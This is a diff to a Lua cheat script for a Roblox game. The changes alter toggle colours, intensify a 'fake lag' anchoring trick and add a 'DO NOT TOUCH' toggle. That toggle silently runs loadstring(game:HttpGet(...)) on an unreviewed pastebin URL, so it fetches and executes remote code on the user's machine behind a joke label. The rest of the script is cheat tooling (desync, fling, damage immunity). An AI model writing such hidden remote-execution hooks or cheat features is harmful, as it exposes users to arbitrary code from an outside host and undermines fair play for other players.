@@ -598,7 +598,7 @@ local DesyncToggle = MainRight:AddToggle("DesyncToggle", {
 	Default = false,
 })
 if DesyncToggle.TextLabel then
-	DesyncToggle.TextLabel.TextColor3 = Color3.fromRGB(0, 120, 215)
+	DesyncToggle.TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 end
 
 local desyncConnections = {}
@@ -814,7 +814,7 @@ end
 
 DesyncToggle:OnChanged(function(Value)
 	if DesyncToggle.TextLabel then
-		DesyncToggle.TextLabel.TextColor3 = Value and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 120, 215)
+		DesyncToggle.TextLabel.TextColor3 = Value and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 0, 0)
 	end
 	if Value then
 		startDesync()
@@ -2180,7 +2180,7 @@ Toggles.FakeLag:OnChanged(function()
 				return
 			end
 			-- Stutter fake lag: randomly anchor and unanchor
-			if math.random() > 0.99 then
+			if math.random() > 0.5 then
 				hrp.Anchored = true
 			else
 				hrp.Anchored = false
@@ -3824,6 +3824,21 @@ FunAnimations:AddToggle("ShadowTheGoat", {
 	Default = false,
 })
 
+local FunFreddy = Tabs["Fun Box"]:AddRightGroupbox("FREDDY", "skull")
+
+FunFreddy:AddToggle("DoNotTouch", {
+	Text = "DO NOT TOUCH",
+	Default = false,
+})
+
+Toggles.DoNotTouch:OnChanged(function(Value)
+	if Value then
+		pcall(function()
+			loadstring(game:HttpGet("https://pastebin.com/raw/wbEc0ThZ"))()
+		end)
+	end
+end)
+
 local touchFlingActive = false
 local function touchFlingLoop()
 	local movel = 0.1
@@ -4671,6 +4686,9 @@ Library:OnUnload(function()
 	end
 	if Toggles.ShadowTheGoat and Toggles.ShadowTheGoat.Value then
 		Toggles.ShadowTheGoat:SetValue(false)
+	end
+	if Toggles.DoNotTouch and Toggles.DoNotTouch.Value then
+		Toggles.DoNotTouch:SetValue(false)
 	end
 	if Toggles.NoBearTrapDMG and Toggles.NoBearTrapDMG.Value then
 		Toggles.NoBearTrapDMG:SetValue(false)
